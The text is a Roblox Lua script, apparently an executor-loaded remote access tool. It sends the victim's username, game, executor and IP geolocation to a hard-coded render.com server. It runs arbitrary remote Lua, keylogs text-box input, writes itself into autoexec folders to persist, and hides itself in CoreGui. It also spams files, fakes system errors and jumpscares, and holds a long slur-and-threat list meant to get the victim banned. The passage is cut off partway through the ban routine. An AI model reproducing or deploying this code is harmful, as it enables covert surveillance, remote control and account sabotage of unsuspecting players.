local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")
local TextChatService = game:GetService("TextChatService")

local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local player = Players.LocalPlayer

-- Новые переменные для камерных функций и AutoBan
local cameraLockEnabled = false
local cameraShakeEnabled = false
local originalCameraType = nil
local cameraLockGui = nil
local mouseLockEnabled = false
local originalMouseBehavior = nil
local autoBanEnabled = false
local autoBanTask = nil

local function getDeviceType()
    if UserInputService.TouchEnabled then
        if UserInputService.MouseEnabled then
            return "Tablet"
        else
            return "Mobile"
        end
    else
        return "PC"
    end
end

local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local scriptHidden = false
local lastUserUpdate = 0
local deviceType = getDeviceType()

local function safeCheck(funcName)
    if funcName == "writefile" then
        return writefile ~= nil
    elseif funcName == "readfile" then
        return readfile ~= nil
    elseif funcName == "listfiles" then
        return listfiles ~= nil
    elseif funcName == "makefolder" then
        return makefolder ~= nil
    elseif funcName == "delfolder" then
        return delfolder ~= nil
    elseif funcName == "delfile" then
        return delfile ~= nil
    elseif funcName == "isfolder" then
        return isfolder ~= nil
    elseif funcName == "identifyexecutor" then
        return identifyexecutor ~= nil
    elseif funcName == "getcustomasset" then
        return getcustomasset ~= nil
    elseif funcName == "saveinstance" then
        return saveinstance ~= nil
    elseif funcName == "getconnections" then
        return getconnections ~= nil
    elseif funcName == "getgc" then
        return getgc ~= nil
    elseif funcName == "getrenv" then
        return getrenv ~= nil
    elseif funcName == "getreg" then
        return getreg ~= nil
    elseif funcName == "getinstances" then
        return getinstances ~= nil
    elseif funcName == "getnilinstances" then
        return getnilinstances ~= nil
    elseif funcName == "gethui" then
        return gethui ~= nil
    elseif funcName == "getscripts" then
        return getscripts ~= nil
    elseif funcName == "isnetworkowner" then
        return isnetworkowner ~= nil
    elseif funcName == "request" then
        return (syn and syn.request) or (request) or (http and http.request)
    end
    return false
end

local function autoInstallToAutoexec()
    if deviceType ~= "PC" or not safeCheck("writefile") then
        return false
    end
    
    local success = pcall(function()
        local scriptSource = "-- RAT System v3.2\n" .. tostring(script.Source)
        
        local autoexecPaths = {
            "autoexec.lua",
            "autoexec/startup.lua",
            "workspace/autoexec.lua",
            "scripts/rat.lua",
            "autoexec/rat.lua",
            "startup.lua",
        }
        
        if syn and syn.writefile then
            table.insert(autoexecPaths, "synapse/autoexec.lua")
            table.insert(autoexecPaths, "synapse/workspace/rat.lua")
        end
        
        if krnl then
            table.insert(autoexecPaths, "krnl/autoexec.lua")
        end
        
        if fluxus then
            table.insert(autoexecPaths, "fluxus/autoexec.lua")
        end
        
        local installedCount = 0
        for _, path in ipairs(autoexecPaths) do
            pcall(function()
                writefile(path, scriptSource)
                installedCount = installedCount + 1
            end)
        end
        
        return installedCount > 0
    end)
    
    return success or false
end

local function httpRequest(params)
    local requestFunc
    
    if syn and syn.request then
        requestFunc = syn.request
    elseif request then
        requestFunc = request
    elseif http and http.request then
        requestFunc = http.request
    else
        return nil
    end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

local function captureScreenshot()
    if RunService:IsStudio() then
        return nil
    end
    
    local screenshot
    
    if getgenv and getgenv().takescreenshot then
        screenshot = getgenv().takescreenshot()
    elseif screencap then
        screenshot = screencap()
    else
        return nil
    end
    
    if screenshot then
        local success, encoded = pcall(function()
            return HttpService:JSONEncode(screenshot)
        end)
        return success and encoded or nil
    end
    
    return nil
end

local function sendUserInfo()
    local currentTime = os.time()
    if currentTime - lastUserUpdate < 15 then
        return
    end
    
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    local success = pcall(function()
        local response = httpRequest({
            Url = SERVER_URL.."/users",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = playerName,
                place = placeName,
                executor = executor,
                device = deviceType
            })
        })
        return response ~= nil
    end)
    
    if success then
        lastUserUpdate = currentTime
    end
end

local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A", 
                ipInfo.city or "N/A"
            )
        end
    end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "inject_notify",
            args = {playerName, placeName, ipData, executor, deviceType}
        })
    })
end

local function getHardwareInfo()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A"
            )
        end
    end

    local fps = 0
    local ping = 0
    
    local success1, fpsValue = pcall(function()
        return math.floor(workspace:GetRealPhysicsFPS())
    end)
    if success1 then fps = fpsValue end
    
    local success2, pingValue = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if success2 then ping = pingValue end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end

    local systemInfo = {
        device_type = deviceType,
        touch_enabled = UserInputService.TouchEnabled,
        mouse_enabled = UserInputService.MouseEnabled,
        keyboard_enabled = UserInputService.KeyboardEnabled,
        screen_size = workspace.CurrentCamera.ViewportSize
    }

    local hardwareData = {
        player = playerName,
        game = placeName,
        fps = fps,
        ping = ping,
        executor = executor,
        ip_info = ipData,
        system = systemInfo
    }
    
    return hardwareData
end

local function memorySpam(fileCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, fileCount do
        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
        
        local success = pcall(function()
            local bigContent = ""
            for j = 1, 100 do
                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
                           string.rep("X", 100) .. "\n"
            end
            
            writefile(filename, bigContent)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

local function gallerySpam(imageCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, imageCount do
        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
        
        local success = pcall(function()
            local content = "fake_video_content_" .. math.random(100000, 999999)
            writefile(filename, content)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        if success then
            return "Успешно: " .. tostring(result)
        else
            return "Ошибка выполнения: " .. tostring(result)
        end
    else
        return "Ошибка компиляции: " .. tostring(err)
    end
end

local function showFakeError(message)
    local success = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "FakeError"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        task.delay(10, function()
            pcall(function()
                if gui and gui.Parent then
                    gui:Destroy()
                end
            end)
        end)
        
        return true
    end)
    
    return success
end

local function showPopupMessage(message)
    local success = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "PopupMessage"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.4, 0, 0.2, 0)
        frame.Position = UDim2.new(0.3, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
        frame.BorderSizePixel = 2
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "📢 Сообщение:\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Gotham
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        frame.BackgroundTransparency = 1
        textLabel.TextTransparency = 1
        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
        local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
        
        tweenIn:Play()
        tweenTextIn:Play()
        
        task.delay(7, function()
            local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
            local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
            
            tweenOut:Play()
            tweenTextOut:Play()
            
            task.delay(0.6, function()
                pcall(function()
                    if gui and gui.Parent then
                        gui:Destroy()
                    end
                end)
            end)
        end)
        
        return true
    end)
    
    return success
end

local function hideScript()
    if scriptHidden then return true end
    
    local success = pcall(function()
        if syn and syn.protect_gui then
            pcall(syn.protect_gui, script.Parent)
        end
        
        script.Name = "UI_"..tostring(math.random(10000,99999))
        
        if getgenv and getgenv().setthreadidentity then
            pcall(getgenv().setthreadidentity, 7)
        end
        
        if script.Parent ~= CoreGui then
            script.Parent = CoreGui
        end
    end)
    
    scriptHidden = success
    return success
end

local function setupKeylogger()
    local success = pcall(function()
        UserInputService.TextBoxFocused:Connect(function(textBox)
            if keyloggerEnabled then
                textBox.FocusLost:Connect(function()
                    if textBox.Text and textBox.Text ~= "" then
                        keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                    end
                end)
            end
        end)
        return true
    end)
    return success
end

local function setupChat()
    local success, result = pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "RatChat"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.Enabled = false

        local chatFrame = Instance.new("Frame")
        chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
        chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        chatFrame.BackgroundTransparency = 0.3
        chatFrame.Active = true
        chatFrame.Draggable = true
        chatFrame.Parent = screenGui

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
        scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.ScrollBarThickness = 5
        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scrollingFrame.Parent = chatFrame

        local textBox = Instance.new("TextBox")
        textBox.Size = UDim2.new(1, -60, 0, 30)
        textBox.Position = UDim2.new(0, 5, 1, -35)
        textBox.PlaceholderText = "Сообщение..."
        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        textBox.ClearTextOnFocus = false
        textBox.Parent = chatFrame

        local sendButton = Instance.new("TextButton")
        sendButton.Size = UDim2.new(0, 50, 0, 30)
        sendButton.Position = UDim2.new(1, -55, 1, -35)
        sendButton.Text = "Отпр."
        sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
        sendButton.Parent = chatFrame

        local function addMessage(sender, text, isSystem)
            local messageFrame = Instance.new("Frame")
            messageFrame.Size = UDim2.new(1, 0, 0, 0)
            messageFrame.AutomaticSize = Enum.AutomaticSize.Y
            messageFrame.BackgroundTransparency = 1
            messageFrame.Parent = scrollingFrame

            local bubble = Instance.new("Frame")
            bubble.Size = UDim2.new(0.8, 0, 0, 0)
            bubble.AutomaticSize = Enum.AutomaticSize.Y
            bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
                                    (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
            bubble.BackgroundTransparency = 0.1
            bubble.Parent = messageFrame

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(0.9, 0, 0, 0)
            textLabel.Position = UDim2.new(0.05, 0, 0, 5)
            textLabel.AutomaticSize = Enum.AutomaticSize.Y
            textLabel.Text = sender..": "..text
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            textLabel.TextWrapped = true
            textLabel.BackgroundTransparency = 1
            textLabel.Parent = bubble

            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
            
            if sender == player.Name and not isSystem then
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "user_chat",
                        args = {sender, text}
                    })
                })
            end
        end

        local function sendMessage()
            local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
            if text ~= "" then
                addMessage(player.Name, text)
                textBox.Text = ""
            end
        end

        textBox.FocusLost:Connect(function(enterPressed)
            if enterPressed then sendMessage() end
        end)

        sendButton.MouseButton1Click:Connect(sendMessage)

        addMessage("Система", "Чат RAT активирован", true)

        return {
            gui = screenGui,
            enabled = false,
            addMessage = addMessage,
            sendMessage = sendMessage
        }
    end)
    
    return success and result or nil
end

local chatSystem = setupChat()

local function createFullscreenGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JumpscareUI"
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    return screenGui
end

local function loadImageFromURL(url, defaultAssetId)
    local success, imageData = pcall(function()
        return game:HttpGet(url, true)
    end)
    
    if success and imageData and #imageData > 100 then
        local tempFile = "jumpscare_img_" .. math.random(10000,99999) .. ".png"
        if safeCheck("writefile") then
            pcall(function()
                writefile(tempFile, imageData)
                
                if getcustomasset then
                    local asset = getcustomasset(tempFile)
                    if asset then
                        return asset
                    end
                end
            end)
        end
    end
    
    return defaultAssetId and "rbxassetid://" .. defaultAssetId or nil
end

local function jeffKillerJumpscare()
    local screenGui = createFullscreenGUI()
    
    local jeffImage = Instance.new("ImageLabel")
    jeffImage.Size = UDim2.new(1, 0, 1, 0)
    jeffImage.Position = UDim2.new(0, 0, 0, 0)
    jeffImage.BackgroundTransparency = 1
    jeffImage.ImageTransparency = 1
    jeffImage.ScaleType = Enum.ScaleType.Crop
    jeffImage.ZIndex = 1000
    jeffImage.Parent = screenGui
    
    local jeffAsset = loadImageFromURL(
        "https://raw.githubusercontent.com/dispetcherr/files/main/image.png",
        "15308155008"
    )
    jeffImage.Image = jeffAsset
    
    local warningSound = Instance.new("Sound")
    warningSound.SoundId = "rbxassetid://18379039436"
    warningSound.Volume = 0.9
    warningSound.Parent = screenGui
    warningSound:Play()
    
    task.wait(5)
    
    local jeffScream = Instance.new("Sound")
    jeffScream.SoundId = "rbxassetid://112005418834382"
    jeffScream.Volume = 2.2
    jeffScream.Parent = screenGui
    
    jeffImage.ImageTransparency = 0
    jeffScream:Play()
    
    for i = 1, 25 do
        jeffImage.Rotation = math.random(-15, 15)
        jeffImage.Position = UDim2.new(0, math.random(-60, 60), 0, math.random(-60, 60))
        task.wait(0.02)
    end
    jeffImage.Rotation = 0
    jeffImage.Position = UDim2.new(0, 0, 0, 0)
    
    local redOverlay = Instance.new("Frame")
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.9
    redOverlay.ZIndex = 1001
    redOverlay.Parent = screenGui
    
    for i = 1, 6 do
        redOverlay.BackgroundTransparency = 0.7
        task.wait(0.07)
        redOverlay.BackgroundTransparency = 0.95
        task.wait(0.07)
    end
    
    pcall(function()
        if redOverlay and redOverlay.Parent then
            redOverlay:Destroy()
        end
    end)
    
    task.wait(1.2)
    
    local fadeOut = TweenService:Create(jeffImage, TweenInfo.new(1.5), {
        ImageTransparency = 1
    })
    fadeOut:Play()
    
    task.wait(1.6)
    
    pcall(function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

local function sonicExeJumpscare()
    local screenGui = createFullscreenGUI()
    
    local blackBg = Instance.new("Frame")
    blackBg.Size = UDim2.new(1, 0, 1, 0)
    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackBg.BackgroundTransparency = 1
    blackBg.ZIndex = 900
    blackBg.Parent = screenGui
    
    local sonicImage = Instance.new("ImageLabel")
    sonicImage.Size = UDim2.new(1, 0, 1, 0)
    sonicImage.Position = UDim2.new(0, 0, 0, 0)
    sonicImage.BackgroundTransparency = 1
    sonicImage.ImageTransparency = 1
    sonicImage.ScaleType = Enum.ScaleType.Crop
    sonicImage.ZIndex = 1000
    sonicImage.Parent = screenGui
    
    local sonicAsset = loadImageFromURL(
        "https://raw.githubusercontent.com/dispetcherr/files/main/sonic_exe.png",
        "13099898470"
    )
    sonicImage.Image = sonicAsset
    
    local errorSound = Instance.new("Sound")
    errorSound.SoundId = "rbxassetid://184702873"
    errorSound.Volume = 0.8
    errorSound.Parent = screenGui
    errorSound:Play()
    
    TweenService:Create(blackBg, TweenInfo.new(0.3), {
        BackgroundTransparency = 0
    }):Play()
    
    task.wait(1.5)
    
    for i = 1, 8 do
        sonicImage.ImageTransparency = 0.3
        sonicImage.Size = UDim2.new(1.1, 0, 1.1, 0)
        sonicImage.Position = UDim2.new(-0.05, 0, -0.05, 0)
        task.wait(0.05)
        
        sonicImage.ImageTransparency = 1
        sonicImage.Size = UDim2.new(1, 0, 1, 0)
        sonicImage.Position = UDim2.new(0, 0, 0, 0)
        task.wait(0.05)
    end
    
    sonicImage.ImageTransparency = 0
    blackBg.BackgroundTransparency = 1
    
    local sonicScream = Instance.new("Sound")
    sonicScream.SoundId = "rbxassetid://112005418834382"
    sonicScream.Volume = 2.0
    sonicScream.Parent = screenGui
    sonicScream:Play()
    
    for i = 1, 30 do
        sonicImage.ImageColor3 = Color3.fromRGB(
            math.random(200, 255),
            math.random(0, 100),
            math.random(0, 100)
        )
        
        sonicImage.Rotation = math.random(-20, 20)
        sonicImage.Position = UDim2.new(
            0, math.random(-80, 80),
            0, math.random(-80, 80)
        )
        
        local scale = 0.9 + math.random() * 0.3
        sonicImage.Size = UDim2.new(scale, 0, scale, 0)
        
        task.wait(0.02)
    end
    
    sonicImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
    sonicImage.Rotation = 0
    sonicImage.Position = UDim2.new(0, 0, 0, 0)
    sonicImage.Size = UDim2.new(1, 0, 1, 0)
    
    local blueOverlay = Instance.new("Frame")
    blueOverlay.Size = UDim2.new(1, 0, 1, 0)
    blueOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 170)
    blueOverlay.BackgroundTransparency = 0.9
    blueOverlay.ZIndex = 1001
    blueOverlay.Parent = screenGui
    
    local errorText = Instance.new("TextLabel")
    errorText.Size = UDim2.new(1, 0, 1, 0)
    errorText.Text = "FATAL ERROR\nSYSTEM CORRUPTED\nSONIC.EXE HAS TAKEN OVER"
    errorText.TextColor3 = Color3.fromRGB(255, 255, 255)
    errorText.TextScaled = true
    errorText.Font = Enum.Font.Code
    errorText.BackgroundTransparency = 1
    errorText.ZIndex = 1002
    errorText.Parent = screenGui
    
    task.wait(1.5)
    
    blueOverlay.BackgroundTransparency = 1
    errorText.TextTransparency = 1
    
    local sonicFade = TweenService:Create(sonicImage, TweenInfo.new(2), {
        ImageTransparency = 1
    })
    sonicFade:Play()
    
    task.wait(2.1)
    
    pcall(function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

local function executeJumpscareCommand(scareType)
    if scareType == 1 then
        jeffKillerJumpscare()
    elseif scareType == 2 then
        sonicExeJumpscare()
    else
        jeffKillerJumpscare()
    end
end

-- ФУНКЦИЯ: Блокировка курсора в центре
local function lockMouseToCenter(enable)
    if mouseLockEnabled == enable then return end
    
    mouseLockEnabled = enable
    local camera = workspace.CurrentCamera
    local viewportSize = camera.ViewportSize
    
    if enable then
        -- Сохраняем текущее поведение мыши
        if UserInputService.MouseBehavior then
            originalMouseBehavior = UserInputService.MouseBehavior
        end
        
        -- Создаем невидимый UI для захвата мыши
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "MouseLockUI"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        
        local lockFrame = Instance.new("Frame")
        lockFrame.Size = UDim2.new(1, 0, 1, 0)
        lockFrame.BackgroundTransparency = 1
        lockFrame.Active = true
        lockFrame.Selectable = true
        lockFrame.Parent = screenGui
        
        -- Центрируем курсор
        task.spawn(function()
            while mouseLockEnabled do
                -- Получаем позицию центра экрана
                local centerX = viewportSize.X / 2
                local centerY = viewportSize.Y / 2
                
                -- Пытаемся установить курсор в центр
                pcall(function()
                    if UserInputService.MouseBehavior then
                        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
                    end
                end)
                
                task.wait(0.1)
            end
        end)
        
        return true
    else
        -- Восстанавливаем поведение мыши
        if originalMouseBehavior then
            pcall(function()
                UserInputService.MouseBehavior = originalMouseBehavior
            end)
            originalMouseBehavior = nil
        end
        
        -- Удаляем UI блокировки
        pcall(function()
            local gui = player:WaitForChild("PlayerGui"):FindFirstChild("MouseLockUI")
            if gui then gui:Destroy() end
        end)
        
        return true
    end
end

-- Улучшенная функция блокировки камеры с блокировкой курсора
local function cameraLock(enable)
    if cameraLockEnabled == enable then return false end
    
    cameraLockEnabled = enable
    local camera = workspace.CurrentCamera
    
    if enable then
        -- Сохраняем текущий тип камеры
        originalCameraType = camera.CameraType
        
        -- Меняем на Scriptable для полного контроля
        camera.CameraType = Enum.CameraType.Scriptable
        
        -- Сохраняем начальную позицию камеры
        local startCFrame = camera.CFrame
        
        -- Запускаем цикл блокировки камеры
        task.spawn(function()
            while cameraLockEnabled and camera do
                camera.CFrame = startCFrame
                task.wait()
            end
        end)
        
        -- Блокируем курсор в центре
        lockMouseToCenter(true)
        
        -- Создаем UI для блокировки ввода
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "CameraLockUI"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        
        local lockFrame = Instance.new("Frame")
        lockFrame.Size = UDim2.new(1, 0, 1, 0)
        lockFrame.BackgroundTransparency = 1
        lockFrame.Active = true
        lockFrame.Selectable = true
        lockFrame.Parent = screenGui
        
        -- Сохраняем ссылку на GUI для удаления
        cameraLockGui = screenGui
        
        -- Блокируем все вводы
        lockFrame.InputBegan:Connect(function()
            return
        end)
        
        return true
    else
        -- Восстанавливаем камеру
        if originalCameraType then
            camera.CameraType = originalCameraType
            originalCameraType = nil
        end
        
        -- Разблокируем курсор
        lockMouseToCenter(false)
        
        -- Удаляем UI блокировки
        pcall(function()
            if cameraLockGui and cameraLockGui.Parent then
                cameraLockGui:Destroy()
                cameraLockGui = nil
            end
        end)
        
        return true
    end
end

-- ФУНКЦИЯ: Тряска камеры
local function cameraShake(duration, intensity)
    if cameraShakeEnabled then return false end
    
    cameraShakeEnabled = true
    local camera = workspace.CurrentCamera
    local originalCFrame = camera.CFrame
    local startTime = os.time()
    
    task.spawn(function()
        while cameraShakeEnabled and camera do
            local currentTime = os.time()
            if currentTime - startTime >= duration then
                break
            end
            
            -- Случайное смещение с плавностью
            local progress = (currentTime - startTime) / duration
            local currentIntensity = intensity * (1 - progress * 0.5) -- постепенно уменьшаем
            
            local offset = Vector3.new(
                (math.random() - 0.5) * 2 * currentIntensity,
                (math.random() - 0.5) * 2 * currentIntensity * 0.5, -- вертикальная тряска меньше
                (math.random() - 0.5) * 2 * currentIntensity
            )
            
            -- Применяем тряску с плавным переходом
            camera.CFrame = originalCFrame * CFrame.new(offset)
            
            task.wait(0.05)
        end
        
        -- Плавное восстановление камеры
        if camera then
            for i = 1, 10 do
                if camera then
                    camera.CFrame = camera.CFrame:Lerp(originalCFrame, i * 0.1)
                    task.wait(0.05)
                end
            end
            camera.CFrame = originalCFrame
        end
        
        cameraShakeEnabled = false
    end)
    
    return true
end

-- ФУНКЦИЯ: AutoBan - агрессивный спам для быстрого бана (ИСПРАВЛЕННАЯ)
local function getBadWords()
    -- Максимально агрессивный список запрещенных слов для гарантированного бана
    return {
        -- Английские крайние оскорбления
        "nigger", "nigga", "n1gg3r", "n1gga", "n i g g e r", "n i g g a",
        "fuck", "f*ck", "f u c k", "motherfucker", "motherf*cker", "m0therfucker",
        "shit", "sh1t", "s h i t", "bullshit", "bullsh1t",
        "bitch", "b1tch", "b i t c h", "son of a bitch", "son0fabitch",
        "asshole", "a$$hole", "ass hole", "a s s h o l e",
        "retard", "r3tard", "retarded", "r e t a r d",
        "whore", "w h o r e", "slut", "s l u t", "prostitute",
        "cunt", "c u n t", "c*nt", "c0nt",
        "dick", "d1ck", "d i c k", "penis", "p e n i s",
        "pussy", "p u s s y", "p*ssy", "p0ssy",
        "bastard", "b a s t a r d", "b4stard",
        
        -- Русские крайние оскорбления
        "хуй", "х у й", "хуесос", "х у е с о с",
        "пизда", "п и з д а", "пиздец", "п и з д е ц",
        "ебан", "е б а н", "ебать", "е б а т ь",
        "блядь", "б л я д ь", "блять", "б л я т ь",
        "сука", "с у к а", "сучка", "с у ч к а",
        "гондон", "г о н д о н", "конч", "к о н ч",
        "мудак", "м у д а к", "мудила", "м у д и л а",
        "урод", "у р о д", "уродина", "у р о д и н а",
        "дебил", "д е б и л", "даун", "д а у н",
        "пидор", "п и д о р", "пидорас", "п и д о р а с",
        
        -- Расистские и дискриминационные слова
        "chink", "gook", "kike", "spic", "wetback", "coon", "jigaboo",
        "white trash", "cracker", "redneck", "hillbilly",
        
        -- Угрозы и насилие
        "kill yourself", "kys", "k y s", "kill you", "murder", "suicide",
        "die", "d i e", "d1e", "death", "dead", "burn in hell",
        "rape", "r a p e", "rapist", "r a p i s t",
        "pedophile", "pedo", "p e d o", "child molester",
        
        -- Провокации на админов и Roblox
        "FUCK ROBLOX", "ROBLOX SUCKS", "ROBLOX IS SHIT", 
        "ADMINS ARE RETARDS", "MODERATORS ARE IDIOTS",
        "BAN ME FAGGOTS", "PERMA BAN ME", "I WANT TO BE BANNED",
        "FUCK YOUR FILTER", "YOUR FILTER IS GARBAGE",
        "I HATE ROBLOX", "ROBLOX SHOULD DIE",
        
        -- Экстремистские фразы
        "heil hitler", "hitler was right", "nazi", "white power",
        "black power", "kill all [race]", "exterminate [race]",
        
        -- Сексуальный контент
        "sex", "s e x", "sexual", "porn", "p o r n", "pornography",
        "hentai", "h e n t a i", "boobs", "b o o b s", "tits", "t i t s",
        "vagina", "v a g i n a", "anal", "a n a l", "blowjob",
        
        -- Провокации на отчет и читы
        "REPORT ME NOW", "I AM CHEATING", "EXPLOITING HARD",
        "USING HACKS", "SCRIPTING", "INJECTING CODE",
        "BYPASSING FILTER", "I AM HACKER", "BYPASSED CHAT",
        "CHEAT ENGINE", "MEMORY HACK", "SPEED HACK",
        
        -- Комбинации для максимальной агрессии
        "NIGGER FUCK SHIT BITCH", "FUCKING RETARDED ADMINS",
        "ROBLOX IS FOR RETARDS", "ALL MODS ARE FAGGOTS",
        "I HOPE YOU DIE ADMINS", "BURN ROBLOX SERVERS",
        "PERMA BAN ME YOU CUNTS", "YOUR MOM IS A WHORE",
        "SUCK MY DICK ROBLOX", "FUCK YOUR STUPID GAME",
        
        -- Специальные символы и капс для усиления
        "!!!NIGGER!!!", "???FUCK???", "###SHIT###", "$$$BITCH$$$",
        "N1GG3R_FUCK3R", "SH1T_H3AD", "B1TCH_4SS",
        "F.U.C.K.Y.O.U", "S.H.I.T.H.E.A.D", "A.S.S.H.O.L.E"
    }
end

local function startAutoBan()
    if autoBanEnabled then return end
    
    autoBanEnabled = true
    
